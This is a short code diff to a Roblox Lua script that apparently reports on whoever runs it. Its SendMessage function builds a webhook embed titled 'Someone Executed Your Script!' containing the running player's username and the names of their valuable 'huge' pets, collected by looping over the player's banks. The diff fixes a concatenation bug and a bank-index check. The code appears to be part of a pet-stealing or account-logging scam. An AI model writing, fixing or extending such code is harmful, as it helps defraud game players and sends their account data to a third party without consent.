@@ -15,7 +15,7 @@ function SendMessage(huges)
 		["embeds"] = {
 			{
 				["title"] = "**Someone Executed Your Script!**",
-				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **HUGE NAMES:** ".. huges..',
+				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **HUGE NAMES:** '.. huges,
 				["type"] = "rich",
 				["color"] = tonumber(0x7269da),
 				["image"] = {
@@ -89,7 +89,7 @@ while true do
 
 		local mybanks = fire123("k")
 		for i, v in pairs(mybanks) do
-			if i ~= 1 and i ~= 2 then
+			if i ~= 1 then
 				print('testing bank')
 				local pets = GetAllHugePets(v.BUID)
 
